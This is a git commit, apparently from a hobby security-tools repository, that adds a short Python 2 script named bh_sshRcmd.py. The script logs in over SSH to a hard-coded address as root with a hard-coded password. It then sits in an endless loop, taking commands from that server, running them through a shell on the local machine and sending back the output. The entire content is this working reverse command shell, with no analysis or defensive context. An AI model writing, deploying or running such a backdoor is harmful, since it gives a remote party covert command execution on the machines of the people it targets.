4fd6497970a3f2e9014456d74912ef5038140294
tempCross <bt.will777@gmail.com>
2017-09-02 13:38:53 -0400

    Add files via upload

---
+++ bh_sshRcmd.py
@@ -0,0 +1,27 @@
+#!/usr/bin/python
+
+import threading 
+import paramiko
+import subprocess
+
+def ssh_command(ip, user, passwd, command):
+    client = paramiko.SSHClient()
+    #client.load_host_keys('/etc/ssh/ssh_host_ecdsa_key')
+    client.load_system_host_keys()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, username=user, password=passwd)
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+        print ssh_session.recv(1024)#read banner
+        while True:
+            command = ssh_session.recv(1024) #get the command from the SSH server
+            try:
+                cmd_output = subprocess.check_output(command, shell=True)
+                ssh_session.send(cmd_output)
+            except Exception,e:
+                ssh_session.send(str(e))
+        client.close()
+    return
+ssh_command('192.168.1.206','root', 'toor', 'Connected ;-)')
+    
